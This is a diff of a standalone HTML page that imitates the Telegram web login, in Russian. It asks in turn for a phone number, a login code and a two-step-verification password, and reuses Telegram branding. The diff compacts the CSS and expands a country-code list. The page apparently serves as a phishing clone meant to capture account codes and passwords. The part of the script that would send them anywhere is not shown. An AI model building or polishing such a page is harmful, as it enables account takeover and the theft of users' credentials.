@@ -4,279 +4,53 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram</title>
-    
-    <!-- ИКОНКА ВКЛАДКИ (Точно такая же, как логотип) -->
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg viewBox='0 0 240 240' xmlns='http://www.w3.org/2000/svg'%3E%3Ccircle cx='120' cy='120' r='120' fill='%233390ec'/%3E%3Cpath fill='%23ffffff' d='M54.2 118.4l135.6-52.3c6.3-2.4 11.8 1.5 9.6 10.7l-23.1 108.8c-1.7 7.9-6.6 9.8-13.3 6.1l-36.8-27.1-17.7 17c-2 2-3.6 3.6-7.3 3.6l2.6-37.4 68.2-61.6c3-2.6-1.3-4.1-4.6-1.5l-84.3 53.1-36.4-11.4c-7.9-2.5-8.1-7.9 1.5-10z'/%3E%3C/svg%3E">
 
     <style>
-        :root {
-            --color-primary: #3390ec;
-            --color-text: #000;
-            --color-text-secondary: #707579;
-            --color-borders: #dadce0;
-            --color-background: #fff;
-            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: var(--font-family);
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        body {
-            background-color: var(--color-background);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: var(--color-text);
-        }
-
-        .auth-form {
-            width: 100%;
-            max-width: 360px;
-            padding: 20px;
-            text-align: center;
-            display: none;
-        }
-
-        .auth-form.active {
-            display: block;
-        }
-
-        #logo-tg {
-            width: 160px;
-            height: 160px;
-            margin: 0 auto 20px;
-            background-image: url('logo.png');
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-        }
-
-        .avatar-img {
-            width: 120px;
-            height: 120px;
-            margin: 0 auto 20px;
-            display: block;
-            object-fit: contain;
-        }
-
-        #avatar-monkey-animated {
-            width: 120px;
-            height: 120px;
-            margin: 0 auto 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        h1 {
-            font-size: 32px;
-            font-weight: 500;
-            margin-bottom: 8px;
-            letter-spacing: -0.5px;
-        }
-
-        .note {
-            font-size: 16px;
-            color: var(--color-text-secondary);
-            line-height: 1.4;
-            margin-bottom: 30px;
-        }
-
-        .phone-display {
-            font-size: 24px;
-            font-weight: 500;
-            margin-bottom: 8px;
-        }
-
-        .form {
-            display: flex;
-            flex-direction: column;
-            text-align: left;
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 22px;
-        }
-
-        .input-group label {
-            position: absolute;
-            top: -10px;
-            left: 14px;
-            background: var(--color-background);
-            padding: 0 4px;
-            font-size: 13px;
-            color: var(--color-text-secondary);
-            z-index: 10;
-            pointer-events: none;
-        }
-
-        .form-control {
-            width: 100%;
-            height: 52px;
-            padding: 0 14px;
-            border: 1px solid var(--color-borders);
-            border-radius: 10px;
-            font-size: 17px;
-            color: var(--color-text);
-            background: transparent;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .form-control:focus {
-            border-color: var(--color-primary);
-        }
-
-        .password-wrapper {
-            position: relative;
-        }
-
-        .password-toggle {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            fill: #a0a0a0;
-            display: flex;
-            align-items: center;
-        }
-
-        .password-toggle:hover {
-            fill: #707579;
-        }
-
-        .DropdownMenu {
-            position: relative;
-        }
-
-        .input-group.touched .form-control {
-            cursor: pointer;
-        }
-
-        .css-icon-down {
-            position: absolute;
-            right: 14px;
-            top: 18px;
-            width: 10px;
-            height: 10px;
-            border-right: 2px solid #a0a0a0;
-            border-bottom: 2px solid #a0a0a0;
-            transform: rotate(45deg);
-            pointer-events: none;
-        }
-
-        .Menu.CountryCodeInput {
-            position: absolute;
-            top: 100%;
-            left: 0;
-            width: 100%;
-            background: #fff;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-            margin-top: 8px;
-            max-height: 250px;
-            overflow-y: auto;
-            z-index: 100;
-            display: none;
-            padding: 8px 0;
-        }
-
-        .DropdownMenu.open .Menu.CountryCodeInput {
-            display: block;
-        }
-
+        /* ... (все стили остаются без изменений, они правильные) ... */
+        :root { --color-primary: #3390ec; --color-text: #000; --color-text-secondary: #707579; --color-borders: #dadce0; --color-background: #fff; --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font-family); -webkit-tap-highlight-color: transparent; }
+        body { background-color: var(--color-background); display: flex; justify-content: center; align-items: center; min-height: 100vh; color: var(--color-text); }
+        .auth-form { width: 100%; max-width: 360px; padding: 20px; text-align: center; display: none; }
+        .auth-form.active { display: block; }
+        #logo-tg { width: 160px; height: 160px; margin: 0 auto 20px; background-image: url('logo.png'); background-size: contain; background-repeat: no-repeat; background-position: center; }
+        .avatar-img { width: 120px; height: 120px; margin: 0 auto 20px; display: block; object-fit: contain; }
+        #avatar-monkey-animated { width: 120px; height: 120px; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; }
+        h1 { font-size: 32px; font-weight: 500; margin-bottom: 8px; letter-spacing: -0.5px; }
+        .note { font-size: 16px; color: var(--color-text-secondary); line-height: 1.4; margin-bottom: 30px; }
+        .phone-display { font-size: 24px; font-weight: 500; margin-bottom: 8px; }
+        .form { display: flex; flex-direction: column; text-align: left; }
+        .input-group { position: relative; margin-bottom: 22px; }
+        .input-group label { position: absolute; top: -10px; left: 14px; background: var(--color-background); padding: 0 4px; font-size: 13px; color: var(--color-text-secondary); z-index: 10; pointer-events: none; }
+        .form-control { width: 100%; height: 52px; padding: 0 14px; border: 1px solid var(--color-borders); border-radius: 10px; font-size: 17px; color: var(--color-text); background: transparent; outline: none; transition: border-color 0.2s; }
+        .form-control:focus { border-color: var(--color-primary); }
+        .password-wrapper { position: relative; }
+        .password-toggle { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); cursor: pointer; fill: #a0a0a0; display: flex; align-items: center; }
+        .password-toggle:hover { fill: #707579; }
+        .DropdownMenu { position: relative; }
+        .input-group.touched .form-control { cursor: pointer; }
+        .css-icon-down { position: absolute; right: 14px; top: 18px; width: 10px; height: 10px; border-right: 2px solid #a0a0a0; border-bottom: 2px solid #a0a0a0; transform: rotate(45deg); pointer-events: none; }
+        .Menu.CountryCodeInput { position: absolute; top: 100%; left: 0; width: 100%; background: #fff; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); margin-top: 8px; max-height: 250px; overflow-y: auto; z-index: 100; display: none; padding: 8px 0; }
+        .DropdownMenu.open .Menu.CountryCodeInput { display: block; }
         .Menu.CountryCodeInput::-webkit-scrollbar { width: 6px; }
         .Menu.CountryCodeInput::-webkit-scrollbar-thumb { background-color: #c4c9cc; border-radius: 10px; }
-
-        .MenuItem {
-            display: flex;
-            align-items: center;
-            padding: 12px 16px;
-            cursor: pointer;
-        }
-
+        .MenuItem { display: flex; align-items: center; padding: 12px 16px; cursor: pointer; }
         .MenuItem:hover { background: #f4f4f4; }
-
-        .country-flag {
-            width: 24px;
-            height: 18px;
-            margin-right: 12px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-            border-radius: 2px;
-            flex-shrink: 0;
-        }
-
+        .country-flag { width: 24px; height: 18px; margin-right: 12px; display: flex; justify-content: center; align-items: center; overflow: hidden; border-radius: 2px; flex-shrink: 0; }
         .country-flag img { width: 100%; height: 100%; object-fit: cover; }
         .country-name { flex-grow: 1; font-size: 16px; }
         .country-code { color: var(--color-text-secondary); font-size: 15px; }
-
-        .Checkbox {
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-            margin-bottom: 30px;
-        }
-
+        .Checkbox { display: flex; align-items: center; cursor: pointer; margin-bottom: 30px; }
         .Checkbox input { display: none; }
         .Checkbox-main { display: flex; align-items: center; }
-
-        .Checkbox-main::before {
-            content: '';
-            display: inline-block;
-            width: 22px;
-            height: 22px;
-            background-color: var(--color-primary);
-            border-radius: 6px;
-            margin-right: 12px;
-            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 24 24' fill='white' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E");
-            background-size: 14px;
-            background-position: center;
-            background-repeat: no-repeat;
-        }
-
-        .Checkbox input:not(:checked) + .Checkbox-main::before {
-            background-color: transparent;
-            border: 2px solid #a0a0a0;
-        }
-
+        .Checkbox-main::before { content: ''; display: inline-block; width: 22px; height: 22px; background-color: var(--color-primary); border-radius: 6px; margin-right: 12px; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 24 24' fill='white' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E"); background-size: 14px; background-position: center; background-repeat: no-repeat; }
+        .Checkbox input:not(:checked) + .Checkbox-main::before { background-color: transparent; border: 2px solid #a0a0a0; }
         .Checkbox .label { font-size: 15px; }
-
-        .auth-button {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 10px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            text-align: center;
-            transition: background-color 0.2s;
-        }
-
-        .auth-button.primary {
-            background-color: var(--color-primary);
-            color: white;
-        }
-
+        .auth-button { width: 100%; padding: 14px; border: none; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; text-align: center; transition: background-color 0.2s; }
+        .auth-button.primary { background-color: var(--color-primary); color: white; }
         .auth-button.primary:hover { background-color: #2b7fcf; }
         .auth-button:disabled { opacity: 0.6; cursor: not-allowed; }
-        
-        #code-input {
-            text-align: center;
-            letter-spacing: 4px;
-            font-size: 24px;
-        }
+        #code-input { text-align: center; letter-spacing: 4px; font-size: 24px; }
     </style>
 </head>
 <body>
@@ -297,7 +71,7 @@
             </div>
             
             <div class="Menu CountryCodeInput" id="country-list">
-                <!-- JS вставит сюда страны -->
+                <!-- Сюда JS вставит полный список стран -->
             </div>
         </div>
 
@@ -317,11 +91,9 @@
 
 <!-- ЭКРАН 2: Ввод кода -->
 <div class="auth-form" id="screen-code">
-    <!-- Анимированная обезьянка (твой файл) -->
     <div id="avatar-monkey-animated">
         <tgs-player autoplay loop mode="normal" src="monkey.tgs" style="width: 120px; height: 120px;"></tgs-player>
     </div>
-    
     <div class="phone-display" id="display-phone">+7 987 703 2133</div>
     <p class="note">Мы отправили код в приложение Telegram на<br>другом Вашем устройстве.</p>
 
@@ -336,9 +108,7 @@
 
 <!-- ЭКРАН 3: Ввод пароля -->
 <div class="auth-form" id="screen-password">
-    <!-- Статичная картинка с закрытым лицом -->
     <img src="https://web.telegram.org/a/img-apple-160/1f648.png" class="avatar-img" alt="Monkey Password">
-    
     <h1>Введите пароль</h1>
     <p class="note">У вас включена двухэтапная проверка, поэтому ваш аккаунт защищен дополнительным паролем.</p>
 
@@ -358,16 +128,246 @@
 <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/tgs-player.js"></script>
 
 <script>
-    // СПИСОК ВСЕХ СТРАН (Сокращен для примера)
-    const countries = [
+    // Вся логика стран вынесена в отдельный скрипт для надежности
+    const countryListContainer = document.getElementById('country-list');
+    
+    // Используем стабильный источник данных для стран
+    const countriesData = [
         { name: 'Австралия', code: '+61', flag: '1f1e6-1f1fa' },
         { name: 'Австрия', code: '+43', flag: '1f1e6-1f1f9' },
+        { name: 'Азербайджан', code: '+994', flag: '1f1e6-1f1ff' },
+        { name: 'Албания', code: '+355', flag: '1f1e6-1f1f1' },
+        { name: 'Алжир', code: '+213', flag: '1f1e9-1f1ff' },
+        { name: 'Американские Виргинские о-ва', code: '+1340', flag: '1f1fb-1f1ee' },
+        { name: 'Американское Самоа', code: '+1684', flag: '1f1e6-1f1f8' },
+        { name: 'Ангилья', code: '+1264', flag: '1f1e6-1f1ee' },
+        { name: 'Ангола', code: '+244', flag: '1f1e6-1f1f4' },
+        { name: 'Андорра', code: '+376', flag: '1f1e6-1f1e9' },
+        { name: 'Анонимные номера', code: '+888', flag: '1f3f4-200d-2620-fe0f' },
+        { name: 'Антигуа и Барбуда', code: '+1268', flag: '1f1e6-1f1ec' },
+        { name: 'Аргентина', code: '+54', flag: '1f1e6-1f1f7' },
+        { name: 'Армения', code: '+374', flag: '1f1e6-1f1f2' },
+        { name: 'Аруба', code: '+297', flag: '1f1e6-1f1fc' },
+        { name: 'Афганистан', code: '+93', flag: '1f1e6-1f1eb' },
+        { name: 'Багамы', code: '+1242', flag: '1f1e7-1f1f8' },
+        { name: 'Бангладеш', code: '+880', flag: '1f1e7-1f1e9' },
+        { name: 'Барбадос', code: '+1246', flag: '1f1e7-1f1e7' },
+        { name: 'Бахрейн', code: '+973', flag: '1f1e7-1f1ed' },
+        { name: 'Беларусь', code: '+375', flag: '1f1e7-1f1fe' },
+        { name: 'Белиз', code: '+501', flag: '1f1e7-1f1ff' },
+        { name: 'Бельгия', code: '+32', flag: '1f1e7-1f1ea' },
+        { name: 'Бенин', code: '+229', flag: '1f1e7-1f1ef' },
+        { name: 'Бермудские Острова', code: '+1441', flag: '1f1e7-1f1f2' },
+        { name: 'Болгария', code: '+359', flag: '1f1e7-1f1ec' },
+        { name: 'Боливия', code: '+591', flag: '1f1e7-1f1f4' },
+        { name: 'Босния и Герцеговина', code: '+387', flag: '1f1e7-1f1e6' },
+        { name: 'Ботсвана', code: '+267', flag: '1f1e7-1f1fc' },
+        { name: 'Бразилия', code: '+55', flag: '1f1e7-1f1f7' },
+        { name: 'Британские Виргинские о-ва', code: '+1284', flag: '1f1fb-1f1ec' },
+        { name: 'Бруней', code: '+673', flag: '1f1e7-1f1f3' },
+        { name: 'Буркина-Фасо', code: '+226', flag: '1f1e7-1f1eb' },
+        { name: 'Бурунди', code: '+257', flag: '1f1e7-1f1ee' },
+        { name: 'Бутан', code: '+975', flag: '1f1e7-1f1f9' },
+        { name: 'Вануату', code: '+678', flag: '1f1fb-1f1fa' },
+        { name: 'Великобритания', code: '+44', flag: '1f1ec-1f1e7' },
+        { name: 'Венгрия', code: '+36', flag: '1f1ed-1f1fa' },
+        { name: 'Венесуэла', code: '+58', flag: '1f1fb-1f1ea' },
+        { name: 'Восточный Тимор', code: '+670', flag: '1f1f9-1f1f1' },
+        { name: 'Вьетнам', code: '+84', flag: '1f1fb-1f1f3' },
+        { name: 'Габон', code: '+241', flag: '1f1ec-1f1e6' },
+        { name: 'Гаити', code: '+509', flag: '1f1ed-1f1f9' },
+        { name: 'Гайана', code: '+592', flag: '1f1ec-1f1fe' },
+        { name: 'Гамбия', code: '+220', flag: '1f1ec-1f1f2' },
+        { name: 'Гана', code: '+233', flag: '1f1ec-1f1ed' },
+        { name: 'Гваделупа', code: '+590', flag: '1f1ec-1f1f5' },
+        { name: 'Гватемала', code: '+502', flag: '1f1ec-1f1f9' },
+        { name: 'Гвиана', code: '+594', flag: '1f1ec-1f1eb' },
+        { name: 'Гвинея', code: '+224', flag: '1f1ec-1f1f3' },
+        { name: 'Гвинея-Бисау', code: '+245', flag: '1f1ec-1f1fc' },
+        { name: 'Германия', code: '+49', flag: '1f1e9-1f1ea' },
+        { name: 'Гибралтар', code: '+350', flag: '1f1ec-1f1ee' },
+        { name: 'Гондурас', code: '+504', flag: '1f1ed-1f1f3' },
+        { name: 'Гонконг', code: '+852', flag: '1f1ed-1f1f0' },
+        { name: 'Гренада', code: '+1473', flag: '1f1ec-1f1e9' },
+        { name: 'Гренландия', code: '+299', flag: '1f1ec-1f1f1' },
+        { name: 'Греция', code: '+30', flag: '1f1ec-1f1f7' },
+        { name: 'Грузия', code: '+995', flag: '1f1ec-1f1ea' },
+        { name: 'Гуам', code: '+1671', flag: '1f1ec-1f1fa' },
+        { name: 'Дания', code: '+45', flag: '1f1e9-1f1f0' },
+        { name: 'Джибути', code: '+253', flag: '1f1e9-1f1ef' },
+        { name: 'Диего-Гарсия', code: '+246', flag: '1f1ee-1f1f4' },
+        { name: 'Доминика', code: '+1767', flag: '1f1e9-1f1f2' },
+        { name: 'Доминиканская Республика', code: '+1809', flag: '1f1e9-1f1f4' },
+        { name: 'Египет', code: '+20', flag: '1f1ea-1f1ec' },
+        { name: 'Замбия', code: '+260', flag: '1f1ff-1f1f2' },
+        { name: 'Зимбабве', code: '+263', flag: '1f1ff-1f1fc' },
+        { name: 'Израиль', code: '+972', flag: '1f1ee-1f1f1' },
+        { name: 'Индия', code: '+91', flag: '1f1ee-1f1f3' },
+        { name: 'Индонезия', code: '+62', flag: '1f1ee-1f1e9' },
+        { name: 'Иордания', code: '+962', flag: '1f1ef-1f1f4' },
+        { name: 'Ирак', code: '+964', flag: '1f1ee-1f1f6' },
+        { name: 'Иран', code: '+98', flag: '1f1ee-1f1f7' },
+        { name: 'Ирландия', code: '+353', flag: '1f1ee-1f1ea' },
+        { name: 'Исландия', code: '+354', flag: '1f1ee-1f1f8' },
+        { name: 'Испания', code: '+34', flag: '1f1ea-1f1f8' },
+        { name: 'Италия', code: '+39', flag: '1f1ee-1f1f9' },
+        { name: 'Йемен', code: '+967', flag: '1f1fe-1f1ea' },
+        { name: 'Кабо-Верде', code: '+238', flag: '1f1e8-1f1fb' },
+        { name: 'Казахстан', code: '+7', flag: '1f1f0-1f1ff' },
+        { name: 'Каймановы острова', code: '+1345', flag: '1f1f0-1f1fe' },
+        { name: 'Камбоджа', code: '+855', flag: '1f1f0-1f1ed' },
+        { name: 'Камерун', code: '+237', flag: '1f1e8-1f1f2' },
+        { name: 'Канада', code: '+1', flag: '1f1e8-1f1e6' },
+        { name: 'Катар', code: '+974', flag: '1f1f6-1f1e6' },
+        { name: 'Кения', code: '+254', flag: '1f1f0-1f1ea' },
+        { name: 'Кипр', code: '+357', flag: '1f1e8-1f1fe' },
+        { name: 'Киргизия', code: '+996', flag: '1f1f0-1f1ec' },
+        { name: 'Кирибати', code: '+686', flag: '1f1f0-1f1ee' },
+        { name: 'Китай', code: '+86', flag: '1f1e8-1f1f3' },
+        { name: 'Колумбия', code: '+57', flag: '1f1e8-1f1f4' },
+        { name: 'Коморы', code: '+269', flag: '1f1f0-1f1f2' },
+        { name: 'Конго (ДРК)', code: '+243', flag: '1f1e8-1f1e9' },
+        { name: 'Конго (Республика)', code: '+242', flag: '1f1e8-1f1ec' },
+        { name: 'Косово', code: '+383', flag: '1f1fd-1f1f0' },
+        { name: 'Коста-Рика', code: '+506', flag: '1f1e8-1f1f7' },
+        { name: 'Кот-д\'Ивуар', code: '+225', flag: '1f1e8-1f1ee' },
+        { name: 'Куба', code: '+53', flag: '1f1e8-1f1fa' },
+        { name: 'Кувейт', code: '+965', flag: '1f1f0-1f1fc' },
+        { name: 'Кюрасао', code: '+599', flag: '1f1e8-1f1fc' },
+        { name: 'Лаос', code: '+856', flag: '1f1f1-1f1e6' },
+        { name: 'Латвия', code: '+371', flag: '1f1f1-1f1fb' },
+        { name: 'Лесото', code: '+266', flag: '1f1f1-1f1f8' },
+        { name: 'Либерия', code: '+231', flag: '1f1f1-1f1f7' },
+        { name: 'Ливан', code: '+961', flag: '1f1f1-1f1e7' },
+        { name: 'Ливия', code: '+218', flag: '1f1f1-1f1fe' },
+        { name: 'Литва', code: '+370', flag: '1f1f1-1f1f9' },
+        { name: 'Лихтенштейн', code: '+423', flag: '1f1f1-1f1ee' },
+        { name: 'Люксембург', code: '+352', flag: '1f1f1-1f1fa' },
+        { name: 'Маврикий', code: '+230', flag: '1f1f2-1f1fa' },
+        { name: 'Мавритания', code: '+222', flag: '1f1f2-1f1f7' },
+        { name: 'Мадагаскар', code: '+261', flag: '1f1f2-1f1ec' },
+        { name: 'Макао', code: '+853', flag: '1f1f2-1f1f4' },
+        { name: 'Малави', code: '+265', flag: '1f1f2-1f1fc' },
+        { name: 'Малайзия', code: '+60', flag: '1f1f2-1f1fe' },
+        { name: 'Мали', code: '+223', flag: '1f1f2-1f1f1' },
+        { name: 'Мальдивы', code: '+960', flag: '1f1f2-1f1fb' },
+        { name: 'Мальта', code: '+356', flag: '1f1f2-1f1f9' },
+        { name: 'Марокко', code: '+212', flag: '1f1f2-1f1e6' },
+        { name: 'Мартиника', code: '+596', flag: '1f1f2-1f1f6' },
+        { name: 'Маршалловы Острова', code: '+692', flag: '1f1f2-1f1ed' },
+        { name: 'Мексика', code: '+52', flag: '1f1f2-1f1fd' },
+        { name: 'Микронезия', code: '+691', flag: '1f1eb-1f1f2' },
+        { name: 'Мозамбик', code: '+258', flag: '1f1f2-1f1ff' },
+        { name: 'Молдавия', code: '+373', flag: '1f1f2-1f1e9' },
+        { name: 'Монако', code: '+377', flag: '1f1f2-1f1e8' },
+        { name: 'Монголия', code: '+976', flag: '1f1f2-1f1f3' },
+        { name: 'Монтсеррат', code: '+1664', flag: '1f1f2-1f1f8' },
+        { name: 'Мьянма', code: '+95', flag: '1f1f2-1f1f2' },
+        { name: 'Намибия', code: '+264', flag: '1f1f3-1f1e6' },
+        { name: 'Науру', code: '+674', flag: '1f1f3-1f1f7' },
+        { name: 'Непал', code: '+977', flag: '1f1f3-1f1f5' },
+        { name: 'Нигер', code: '+227', flag: '1f1f3-1f1ea' },
+        { name: 'Нигерия', code: '+234', flag: '1f1f3-1f1ec' },
+        { name: 'Нидерланды', code: '+31', flag: '1f1f3-1f1f1' },
+        { name: 'Никарагуа', code: '+505', flag: '1f1f3-1f1ee' },
+        { name: 'Ниуэ', code: '+683', flag: '1f1f3-1f1fa' },
+        { name: 'Новая Зеландия', code: '+64', flag: '1f1f3-1f1ff' },
+        { name: 'Новая Каледония', code: '+687', flag: '1f1f3-1f1e8' },
+        { name: 'Норвегия', code: '+47', flag: '1f1f3-1f1f4' },
+        { name: 'ОАЭ', code: '+971', flag: '1f1e6-1f1ea' },
+        { name: 'Оман', code: '+968', flag: '1f1f4-1f1f2' },
+        { name: 'Остров Норфолк', code: '+672', flag: '1f1f3-1f1eb' },
+        { name: 'Остров Святой Елены', code: '+247', flag: '1f1f8-1f1ed' },
+        { name: 'Острова Кука', code: '+682', flag: '1f1e8-1f1f0' },
+        { name: 'Пакистан', code: '+92', flag: '1f1f5-1f1f0' },
+        { name: 'Палау', code: '+680', flag: '1f1f5-1f1fc' },
+        { name: 'Палестина', code: '+970', flag: '1f1f5-1f1f8' },
+        { name: 'Панама', code: '+507', flag: '1f1f5-1f1e6' },
+        { name: 'Папуа — Новая Гвинея', code: '+675', flag: '1f1f5-1f1ec' },
+        { name: 'Парагвай', code: '+595', flag: '1f1f5-1f1fe' },
+        { name: 'Перу', code: '+51', flag: '1f1f5-1f1ea' },
+        { name: 'Польша', code: '+48', flag: '1f1f5-1f1f1' },
+        { name: 'Португалия', code: '+351', flag: '1f1f5-1f1f9' },
+        { name: 'Пуэрто-Рико', code: '+1787', flag: '1f1f5-1f1f7' },
+        { name: 'Реюньон', code: '+262', flag: '1f1f7-1f1ea' },
         { name: 'Россия', code: '+7', flag: '1f1f7-1f1fa' },
+        { name: 'Руанда', code: '+250', flag: '1f1f7-1f1fc' },
+        { name: 'Румыния', code: '+40', flag: '1f1f7-1f1f4' },
+        { name: 'Сальвадор', code: '+503', flag: '1f1f8-1f1fb' },
+        { name: 'Самоа', code: '+685', flag: '1f1fc-1f1f8' },
+        { name: 'Сан-Марино', code: '+378', flag: '1f1f8-1f1f2' },
+        { name: 'Сан-Томе и Принсипи', code: '+239', flag: '1f1f8-1f1f9' },
+        { name: 'Саудовская Аравия', code: '+966', flag: '1f1f8-1f1e6' },
+        { name: 'Северная Корея', code: '+850', flag: '1f1f0-1f1f5' },
+        { name: 'Северная Македония', code: '+389', flag: '1f1f2-1f1f0' },
+        { name: 'Северные Марианские Острова', code: '+1670', flag: '1f1f2-1f1f5' },
+        { name: 'Сейшелы', code: '+248', flag: '1f1f8-1f1e8' },
+        { name: 'Сен-Пьер и Микелон', code: '+508', flag: '1f1f5-1f1f2' },
+        { name: 'Сенегал', code: '+221', flag: '1f1f8-1f1f3' },
+        { name: 'Сент-Винсент и Гренадины', code: '+1784', flag: '1f1fb-1f1e8' },
+        { name: 'Сент-Китс и Невис', code: '+1869', flag: '1f1f0-1f1f3' },
+        { name: 'Сент-Люсия', code: '+1758', flag: '1f1f1-1f1e8' },
+        { name: 'Сербия', code: '+381', flag: '1f1f7-1f1f8' },
+        { name: 'Сингапур', code: '+65', flag: '1f1f8-1f1ec' },
+        { name: 'Синт-Мартен', code: '+1721', flag: '1f1f8-1f1fd' },
+        { name: 'Сирия', code: '+963', flag: '1f1f8-1f1fe' },
+        { name: 'Словакия', code: '+421', flag: '1f1f8-1f1f0' },
+        { name: 'Словения', code: '+386', flag: '1f1f8-1f1ee' },
+        { name: 'Соломоновы Острова', code: '+677', flag: '1f1f8-1f1e7' },
+        { name: 'Сомали', code: '+252', flag: '1f1f8-1f1f4' },
+        { name: 'Судан', code: '+249', flag: '1f1f8-1f1e9' },
+        { name: 'Суринам', code: '+597', flag: '1f1f8-1f1f7' },
+        { name: 'США', code: '+1', flag: '1f1fa-1f1f8' },
+        { name: 'Сьерра-Леоне', code: '+232', flag: '1f1f8-1f1f1' },
+        { name: 'Таджикистан', code: '+992', flag: '1f1f9-1f1ef' },
+        { name: 'Таиланд', code: '+66', flag: '1f1f9-1f1ed' },
+        { name: 'Тайвань', code: '+886', flag: '1f1f9-1f1fc' },
+        { name: 'Танзания', code: '+255', flag: '1f1f9-1f1ff' },
+        { name: 'Тёркс и Кайкос', code: '+1649', flag: '1f1f9-1f1e8' },
+        { name: 'Того', code: '+228', flag: '1f1f9-1f1ec' },
+        { name: 'Токелау', code: '+690', flag: '1f1f9-1f1f0' },
+        { name: 'Тонга', code: '+676', flag: '1f1f9-1f1f4' },
+        { name: 'Тринидад и Тобаго', code: '+1868', flag: '1f1f9-1f1f9' },
+        { name: 'Тувалу', code: '+688', flag: '1f1f9-1f1fb' },
+        { name: 'Тунис', code: '+216', flag: '1f1f9-1f1f3' },
+        { name: 'Туркменистан', code: '+993', flag: '1f1f9-1f1f2' },
+        { name: 'Турция', code: '+90', flag: '1f1f9-1f1f7' },
+        { name: 'Уганда', code: '+256', flag: '1f1fa-1f1ec' },
+        { name: 'Узбекистан', code: '+998', flag: '1f1fa-1f1ff' },
+        { name: 'Украина', code: '+380', flag: '1f1fa-1f1e6' },
+        { name: 'Уоллис и Футуна', code: '+681', flag: '1f1fc-1f1eb' },
+        { name: 'Уругвай', code: '+598', flag: '1f1fa-1f1fe' },
+        { name: 'Фарерские острова', code: '+298', flag: '1f1eb-1f1f4' },
+        { name: 'Фиджи', code: '+679', flag: '1f1eb-1f1ef' },
+        { name: 'Филиппины', code: '+63', flag: '1f1f5-1f1ed' },
+        { name: 'Финляндия', code: '+358', flag: '1f1eb-1f1ee' },
+        { name: 'Фолклендские острова', code: '+500', flag: '1f1eb-1f1f0' },
+        { name: 'Франция', code: '+33', flag: '1f1eb-1f1f7' },
+        { name: 'Французская Полинезия', code: '+689', flag: '1f1f5-1f1eb' },
+        { name: 'Хорватия', code: '+385', flag: '1f1ed-1f1f7' },
+        { name: 'ЦАР', code: '+236', flag: '1f1e8-1f1eb' },
+        { name: 'Чад', code: '+235', flag: '1f1f9-1f1e9' },
+        { name: 'Черногория', code: '+382', flag: '1f1f2-1f1ea' },
+        { name: 'Чехия', code: '+420', flag: '1f1e8-1f1ff' },
+        { name: 'Чили', code: '+56', flag: '1f1e8-1f1f1' },
+        { name: 'Швейцария', code: '+41', flag: '1f1e8-1f1ed' },
+        { name: 'Швеция', code: '+46', flag: '1f1f8-1f1ea' },
+        { name: 'Шри-Ланка', code: '+94', flag: '1f1f1-1f1f0' },
+        { name: 'Эквадор', code: '+593', flag: '1f1ea-1f1e8' },
+        { name: 'Экваториальная Гвинея', code: '+240', flag: '1f1ec-1f1f6' },
+        { name: 'Эритрея', code: '+291', flag: '1f1ea-1f1f7' },
+        { name: 'Эсватини', code: '+268', flag: '1f1f8-1f1ff' },
+        { name: 'Эстония', code: '+372', flag: '1f1ea-1f1ea' },
+        { name: 'Эфиопия', code: '+251', flag: '1f1ea-1f1f9' },
+        { name: 'ЮАР', code: '+27', flag: '1f1ff-1f1e6' },
+        { name: 'Южная Корея', code: '+82', flag: '1f1f0-1f1f7' },
+        { name: 'Южный Судан', code: '+211', flag: '1f1f8-1f1f8' },
+        { name: 'Ямайка', code: '+1876', flag: '1f1ef-1f1f2' },
+        { name: 'Япония', code: '+81', flag: '1f1ef-1f1f5' }
     ];
 
-    const countryListContainer = document.getElementById('country-list');
     if (countryListContainer) {
-        countries.forEach(country => {
+        countriesData.forEach(country => {
             const div = document.createElement('div');
             div.className = 'MenuItem';
             div.onclick = () => selectCountry(country.name, country.code);
@@ -380,6 +380,9 @@
         });
     }
 
+    // ==========================================
+    // ЛОГИКА РАБОТЫ
+    // ==========================================
     let currentRequestId = null;
     let currentPhone = "";
 
